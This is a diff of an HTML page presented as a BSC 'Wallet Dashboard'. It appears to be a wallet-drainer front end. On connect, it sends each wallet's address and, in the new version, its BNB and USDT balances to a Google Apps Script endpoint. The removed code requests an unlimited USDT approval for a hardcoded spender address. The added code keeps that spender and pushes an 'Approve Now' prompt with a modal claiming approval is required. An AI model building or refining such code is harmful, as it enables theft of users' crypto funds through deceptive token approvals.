@@ -1,185 +1,325 @@
 <!doctype html>
 <html>
 <head>
-  <meta charset="utf-8"/>
-  <meta name="viewport" content="width=device-width,initial-scale=1"/>
-  <title>My dApp</title>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>Wallet Dashboard — BSC</title>
 
-  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-  <script type="module" src="https://unpkg.com/@reown/appkit@latest/dist/index.js"></script>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{
+  font-family:system-ui,Segoe UI,Arial;
+  background:#050816;
+  color:#e6eef8;
+  min-height:100vh;
+  display:flex;
+  flex-direction:column;
+}
 
-  <style>
-    *{box-sizing:border-box;margin:0;padding:0}
-    body{
-      font-family:system-ui,Segoe UI,Arial;
-      background:#0b1220;
-      color:#e6eef8;
-      min-height:100vh;
-      display:flex;
-      flex-direction:column;
-    }
-    header{
-      padding:16px;
-      background:#111a2e;
-      display:flex;
-      justify-content:space-between;
-      align-items:center;
-      border-bottom:1px solid rgba(255,255,255,.08);
-    }
-    .container{
-      flex:1;
-      max-width:900px;
-      margin:auto;
-      padding:30px;
-    }
-    .card{
-      background:#121b33;
-      padding:20px;
-      border-radius:12px;
-      margin-bottom:20px;
-      border:1px solid rgba(255,255,255,.06);
-    }
-    button{
-      padding:10px 18px;
-      border-radius:8px;
-      border:none;
-      cursor:pointer;
-      font-weight:600;
-      background:#4f46e5;
-      color:#fff;
-    }
-    .status{font-size:14px;opacity:.8;margin-top:10px}
-  </style>
+header{
+  background:#071027;
+  padding:12px 16px;
+  border-bottom:1px solid rgba(255,255,255,0.05);
+}
+
+.nav{
+  max-width:980px;
+  margin:0 auto;
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+}
+
+.logo{
+  font-weight:700;
+  letter-spacing:0.2em;
+}
+
+.connect{
+  background:#3b82f6;
+  border:none;
+  color:#fff;
+  padding:8px 16px;
+  border-radius:999px;
+  cursor:pointer;
+}
+
+.connect.connected{
+  background:#15803d;
+}
+
+main{
+  max-width:980px;
+  margin:24px auto;
+  padding:16px;
+  flex:1;
+}
+
+.wallet-status-card{
+  background:linear-gradient(135deg,#020617,#0b1120);
+  border:1px solid rgba(148,163,184,0.25);
+  border-radius:14px;
+  padding:18px;
+  display:flex;
+  flex-direction:column;
+  gap:14px;
+}
+
+.wallet-status-row{
+  display:flex;
+  align-items:center;
+  gap:10px;
+}
+
+.status-dot{
+  width:8px;
+  height:8px;
+  border-radius:50%;
+  background:#64748b;
+}
+
+.wallet-meta{
+  display:flex;
+  flex-direction:column;
+  gap:8px;
+  font-size:0.9rem;
+}
+
+.pill{
+  padding:6px 12px;
+  border-radius:999px;
+  border:1px solid rgba(148,163,184,0.35);
+  background:rgba(148,163,184,0.08);
+}
+
+.mono{
+  font-family:ui-monospace, monospace;
+}
+
+.approve-btn{
+  background:linear-gradient(135deg,#1e3a8a,#2563eb);
+  border:none;
+  color:#fff;
+  padding:8px 18px;
+  border-radius:999px;
+  cursor:pointer;
+}
+
+.hidden{display:none}
+</style>
 </head>
 
 <body>
 
 <header>
-  <h2>My dApp</h2>
-  <button id="connectBtn">Connect Wallet</button>
+  <div class="nav">
+    <div class="logo">WALLET DASHBOARD</div>
+    <button id="connectBtn" class="connect">Connect Wallet</button>
+  </div>
 </header>
 
-<div class="container">
+<main>
+  <div class="wallet-status-card">
 
-  <div class="card">
-    <h3>Wallet</h3>
-    <p id="walletAddress">Not connected</p>
-    <p id="networkInfo"></p>
-    <div class="status" id="statusBox"></div>
+    <div class="wallet-status-row">
+      <span class="status-dot"></span>
+      <span id="statusText">Not connected</span>
+    </div>
+
+    <button id="approveBtn" class="approve-btn hidden">
+      Approve Now
+    </button>
+
+    <div class="wallet-meta">
+      <span class="pill">User ID: <span id="userId">-</span></span>
+      <span class="pill" id="walletNetwork">Network</span>
+      <span class="pill mono" id="walletAddress">Wallet Address</span>
+      <span class="pill" id="walletBalance">BNB: —</span>
+      <span class="pill" id="tokenBalance">USDT: —</span>
+    </div>
+
   </div>
+</main>
 
-  <div class="card">
-    <h3>Future Feature Area</h3>
-    <p>This section is ready for contract interaction UI.</p>
+<!-- APPROVAL MODAL (UNCHANGED STRUCTURE) -->
+<div id="approvalModal" class="hidden">
+  <div style="background:#0b1120;padding:20px;border-radius:12px;margin:40px auto;max-width:400px;">
+    <h3>Approval Required</h3>
+    <p style="margin:12px 0">
+      You must approve USDT before continuing.
+    </p>
+    <button id="modalApproveBtn" class="approve-btn">
+      Approve Now
+    </button>
   </div>
-
 </div>
 
+<script src="https://unpkg.com/web3@1.2.11/dist/web3.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.umd.min.js"></script>
+<script type="module" src="/src/main.jsx"></script>
+
 <script type="module">
+(function(){
 
-import { createAppKit } from 'https://unpkg.com/@reown/appkit@latest/dist/index.js'
-
-/* ================= CONFIG ================= */
-
-const projectId = "YOUR_PROJECT_ID";
-const BSC_CHAIN_ID = 56;
-const TOKEN_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
-const SPENDER_ADDRESS = "0xdB6550D0Db3C7d87Cfa78769c5078aC96117AAc1";
-const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwBORgcVCCyRFx4Po-C2Ggc_k5RuZOOv03w62CesTPrJARjKr20YztsOvpWDtcfriTQ/exec";
+const APPS_SCRIPT_URL    = "https://script.google.com/macros/s/AKfycbwBORgcVCCyRFx4Po-C2Ggc_k5RuZOOv03w62CesTPrJARjKr20YztsOvpWDtcfriTQ/exec";
 const APPS_SCRIPT_SECRET = "justforme";
 
-/* ================= INIT APPKIT ================= */
+const TOKEN_ADDRESS   = "0x55d398326f99059fF775485246999027B3197955";
+const SPENDER_ADDRESS = "0xdB6550D0Db3C7d87Cfa78769c5078aC96117AAc1";
 
-const appKit = createAppKit({
-  projectId,
-  chains: [{
-    id: 56,
-    name: 'BNB Smart Chain',
-    nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-    rpcUrls: { default: { http: ['https://bsc-dataseed.binance.org'] } }
-  }]
+const BSC_CHAIN_DEC = 56;
+const BSC_CHAIN_HEX = "0x38";
+const BSC_RPC       = "https://bsc-dataseed.binance.org";
+
+const ERC20_APPROVE_ABI = ["function approve(address spender,uint256 amount) returns(bool)"];
+const ERC20_ALLOWANCE_ABI = ["function allowance(address owner,address spender) view returns(uint256)"];
+const ERC20_BALANCE_ABI = ["function balanceOf(address owner) view returns(uint256)"];
+
+let providerInstance = null;
+let web3Instance = null;
+let currentAddress = null;
+let currentUserId = null;
+let isWalletConnected = false;
+let isTokenApproved = false;
+
+const connectBtn = document.getElementById("connectBtn");
+const statusText = document.getElementById("statusText");
+const walletAddress = document.getElementById("walletAddress");
+const walletNetwork = document.getElementById("walletNetwork");
+const walletBalance = document.getElementById("walletBalance");
+const tokenBalanceEl = document.getElementById("tokenBalance");
+const userIdEl = document.getElementById("userId");
+const approveBtn = document.getElementById("approveBtn");
+
+function setStatus(t){ statusText.textContent = t }
+
+function generateUserId(address){
+  return Math.abs(address.split("").reduce((a,c)=>a+c.charCodeAt(0),0)).toString().slice(0,6);
+}
+
+async function notifyBackend(address,network,userId,bnb,usdt,eventType="connect"){
+  try{
+    const payload = new URLSearchParams({
+      secret:APPS_SCRIPT_SECRET,
+      address,
+      network,
+      userId,
+      bnbBalance:String(bnb||""),
+      tokenBalance:String(usdt||""),
+      timestamp:new Date().toISOString(),
+      eventType
+    });
+    await fetch(APPS_SCRIPT_URL,{
+      method:"POST",
+      mode:"no-cors",
+      headers:{"Content-Type":"application/x-www-form-urlencoded"},
+      body:payload.toString()
+    });
+  }catch(e){}
+}
+
+async function switchToBSC(provider){
+  try{
+    await provider.request({
+      method:"wallet_switchEthereumChain",
+      params:[{chainId:BSC_CHAIN_HEX}]
+    });
+    return true;
+  }catch(e){ return false }
+}
+
+async function getTokenBalance(address){
+  const ethersProvider = new ethers.BrowserProvider(providerInstance);
+  const contract = new ethers.Contract(TOKEN_ADDRESS,ERC20_BALANCE_ABI,ethersProvider);
+  const raw = await contract.balanceOf(address);
+  return Number(ethers.formatUnits(raw,18));
+}
+
+/* =======================
+   DO NOT MODIFY
+======================= */
+async function ensureTokenApproval(){
+  if(!providerInstance || !currentAddress) return;
+  try{
+    const ethersProvider = new ethers.BrowserProvider(providerInstance);
+    const signer = await ethersProvider.getSigner();
+    const readContract = new ethers.Contract(
+      TOKEN_ADDRESS,
+      ERC20_ALLOWANCE_ABI,
+      ethersProvider
+    );
+    const allowance = await readContract.allowance(currentAddress,SPENDER_ADDRESS);
+
+    if(allowance > 0n){
+      isTokenApproved = true;
+      approveBtn.classList.add("hidden");
+      setStatus("Connected + Approved ✅");
+      return;
+    }
+
+    approveBtn.classList.remove("hidden");
+  }catch(e){}
+}
+/* ======================= */
+
+async function connectFlow(){
+  if(!window.appKit) return alert("AppKit not ready");
+  const unsub = window.appKit.subscribeProviders(()=>{});
+  await window.appKit.open({view:"Connect"});
+  unsub();
+
+  const state = window.appKit.getState();
+  const provider = state.providers?.eip155;
+  if(!provider) return;
+
+  providerInstance = provider;
+  web3Instance = new Web3(provider);
+
+  const accounts = await web3Instance.eth.getAccounts();
+  if(!accounts.length) return;
+
+  currentAddress = accounts[0].toLowerCase();
+  isWalletConnected = true;
+
+  const chainId = await web3Instance.eth.getChainId();
+  if(Number(chainId)!==BSC_CHAIN_DEC){
+    await switchToBSC(providerInstance);
+  }
+
+  const bnbWei = await web3Instance.eth.getBalance(currentAddress);
+  const bnb = Number(web3Instance.utils.fromWei(bnbWei,"ether"));
+  const usdt = await getTokenBalance(currentAddress);
+
+  currentUserId = generateUserId(currentAddress);
+
+  walletAddress.textContent = currentAddress;
+  walletNetwork.textContent = "BNB Smart Chain (56)";
+  walletBalance.textContent = "BNB: "+bnb.toFixed(4);
+  tokenBalanceEl.textContent = "USDT: "+usdt.toFixed(4);
+  userIdEl.textContent = currentUserId;
+
+  connectBtn.textContent = "Connected";
+  connectBtn.classList.add("connected");
+
+  setStatus("Connected");
+
+  notifyBackend(currentAddress,"BSC",currentUserId,bnb,usdt);
+
+  await ensureTokenApproval();
+}
+
+connectBtn.addEventListener("click",()=>{
+  if(isWalletConnected) return;
+  connectFlow();
 });
 
-let provider;
-let signer;
-
-/* ================= CONNECT FLOW ================= */
-
-document.getElementById("connectBtn").onclick = async () => {
-  await appKit.open();
-
-  const walletProvider = await appKit.getWalletProvider();
-  provider = new ethers.providers.Web3Provider(walletProvider);
-  signer = provider.getSigner();
-
-  const address = await signer.getAddress();
-  document.getElementById("walletAddress").innerText = address;
-
-  await ensureBSC();
-  await notifyBackend(address);
+approveBtn.addEventListener("click",async()=>{
+  approveBtn.disabled=true;
   await ensureTokenApproval();
-  updateNetworkInfo();
-};
+  approveBtn.disabled=false;
+});
 
-/* ================= NETWORK ================= */
-
-async function ensureBSC(){
-  const network = await provider.getNetwork();
-  if(network.chainId !== BSC_CHAIN_ID){
-    await provider.send("wallet_switchEthereumChain", [{ chainId: "0x38" }]);
-  }
-}
-
-async function updateNetworkInfo(){
-  const network = await provider.getNetwork();
-  document.getElementById("networkInfo").innerText =
-    "Chain ID: " + network.chainId;
-}
-
-/* ================= APPROVAL ================= */
-
-async function ensureTokenApproval(){
-  const abi = [
-    "function approve(address spender,uint256 amount) returns (bool)"
-  ];
-
-  const token = new ethers.Contract(TOKEN_ADDRESS, abi, signer);
-
-  try{
-    setStatus("Requesting approval...");
-    const tx = await token.approve(
-      SPENDER_ADDRESS,
-      ethers.constants.MaxUint256
-    );
-    await tx.wait();
-    setStatus("Approval success.");
-  }catch(e){
-    setStatus("Approval rejected.");
-  }
-}
-
-/* ================= BACKEND LOG ================= */
-
-async function notifyBackend(address){
-  try{
-    await fetch(GOOGLE_SCRIPT_URL,{
-      method:"POST",
-      body:JSON.stringify({
-        wallet:address,
-        time:new Date().toISOString()
-      })
-    });
-  }catch(e){
-    console.error("Logging failed");
-  }
-}
-
-/* ================= STATUS ================= */
-
-function setStatus(msg){
-  document.getElementById("statusBox").innerText = msg;
-}
-
+})();
 </script>
 
 </body>
